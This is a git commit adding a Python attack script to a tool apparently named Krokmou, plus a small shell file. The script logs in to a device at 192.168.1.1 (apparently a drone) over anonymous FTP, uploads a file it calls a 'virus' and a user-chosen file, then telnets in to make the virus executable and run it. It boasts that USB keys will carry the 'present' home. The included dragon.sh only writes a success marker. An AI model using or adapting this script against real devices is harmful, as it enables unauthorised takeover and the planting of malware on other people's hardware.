7e32b84ed4039bcd68354f06c0d86897a2318d6e
D0wnL0ck <pernot.alexis@gmail.com>
2019-02-14 00:00:43 +0100

    Krokmou v1.1

---
+++ christmas_present.py
@@ -0,0 +1,89 @@
+#!/usr/bin/env python3
+import os, time, sys, telnetlib
+from ftplib import FTP
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
+
+def animate(length):
+    for value in range(1,length):
+        sys.stdout.write(GREEN + '.')
+        sys.stdout.flush()
+        time.sleep(0.05)
+
+#Leaving a christmas present on the drone
+def christmas_present_main():
+    header = '{}Krokmou > '.format(GREEN,WHITE)
+    virus = "dragon.sh"
+
+    print("\n{}Preparing {}Santa's Sleigh{}".format(GREEN,RED,GREEN),end='')
+    animate(10)
+    print('\n\n{}Feeding the {}reindeers{}'.format(GREEN,RED,GREEN),end='')
+    animate(10)
+    print('\n\n{}What do you want to put in your {}present{} ?'.format(GREEN,RED,GREEN))
+    print('{}Enter the path to the file you want to upload to Krokmou\nLeave it blank and press ENTER if you want to send a {}beautiful picture{} of {}Krokmou{}.\n'.format(YELLOW,GREEN,YELLOW,RED,GREEN))
+
+    path = input(header)
+    if(path==''):
+        path = "krokmou.png"
+
+    print('\n{}Trying to locate and talk to {}Krokmou{}'.format(GREEN,RED,GREEN),end='')
+    animate(10)
+    try:
+        ftp = FTP('192.168.1.1','anonymous','anonymous@', timeout=3)
+    except:
+        print("\n\n{}ERROR{}: Can't find Krokmou or Krokmou does't want to talk.\n".format(RED,GREEN))
+        os._exit(1)
+
+    print("\n{}Krokmou{} located and ready to discuss !\n".format(RED,GREEN))
+
+    print('\n{}Sending {}virus{} to {}Krokmou'.format(GREEN,RED,GREEN,YELLOW),end='')
+    animate(10)
+    try:
+        virus_file = open(virus,'rb')
+        ftp.storbinary('STOR '+ virus, virus_file)
+        virus_file.close()
+    except:
+        print("\n\n{}ERROR{}: Can't send virus to Krokmou\n".format(RED,GREEN))
+        os._exit(1)
+
+    print("\n{}Virus successfully sent to {}Krokmou{} !\n".format(GREEN,RED,GREEN))
+
+    print('\n{}Sending {}christmas present{} to {}Krokmou'.format(GREEN,RED,GREEN,YELLOW),end='')
+    animate(10)
+    try:
+        present_file = open(path,'rb')
+        ftp.storbinary('STOR '+ path, present_file)
+        present_file.close()
+    except:
+        print("\n\n{}ERROR{}: Can't send {}christmas present{} to Krokmou\n".format(RED,GREEN,RED,GREEN))
+        os._exit(1)
+
+    try:
+        ftp.quit()
+    except:
+        print("\n\n{}ERROR{}: Can't quit (FTP) Krokmou !\n".format(RED,GREEN))
+        os._exit(1)
+
+    print("\n{}Christmas present successfully sent to {}Krokmou{} !\n".format(GREEN,RED,GREEN))
+
+    print("\n{}Santa{} successfully delivered the {}package{} !\n".format(RED,GREEN,YELLOW,GREEN))
+
+    print("\n{}Trying to run the virus".format(GREEN), end='')
+    animate(10)
+    try:
+        telnet = telnetlib.Telnet("192.168.1.1")
+        telnet.write(b"cd /data/video\n")
+        telnet.write(b"ls\n")
+        telnet.write(b"chmod +x dragon.sh\n")
+        telnet.write(b"./dragon.sh\n")
+        telnet.close()
+    except:
+        print("\n\n{}ERROR{}: Can't talk to Krokmou !\n".format(RED,GREEN))
+        os._exit(1)
+
+    print("\n{}Virus {}successfully{} running on {}Krokmou{} !\n".format(GREEN,YELLOW,GREEN,RED,GREEN))
+
+    print("\n{}Every USB key{} will now go home with your {}little present{} :D{} !\n".format(RED,GREEN,YELLOW,RED,GREEN))
+    print("\n{}Press ENTER to return to main menu...".format(GREEN))
+    enter = input()
+    os.system("clear")
---
+++ dragon.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+echo 'success' > success.txt
